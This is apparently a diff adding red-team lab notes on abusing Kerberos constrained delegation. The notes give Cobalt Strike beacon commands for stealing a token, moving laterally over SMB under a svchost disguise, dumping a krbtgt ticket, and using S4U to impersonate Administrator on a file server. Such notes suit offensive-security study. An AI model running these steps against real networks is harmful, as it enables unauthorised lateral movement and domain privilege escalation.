@@ -1,0 +1,22 @@
+use LDAP to find users with constrained delegation (where the AllowedToDelegateTo attribute is not null)
+
+we see LON-WS-1$ is AllowedToDelegateTo to cifs (file server) and has a non-default UAC value
+
+we verify that protocol transition is enabled
+
+move laterally to the web server
+    steal token from rsteel
+    beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+    beacon> jump scshell64 lon-ws-1 smb
+
+now interact with the web server beacon and enumerate available tickets
+    beacon> krb_dump luid:3e7 /service:krbtgt
+
+copy the ticket and save for later
+
+now perform the attack!
+    beacon> krb_s4u /ticket:[stored_tgt] /service:cifs/lon-fs-1 /impersonateuser:Administrator
+
+krb_describe /ticket:[returned ticket]
+
+now we use the ticket to interact with the file server!
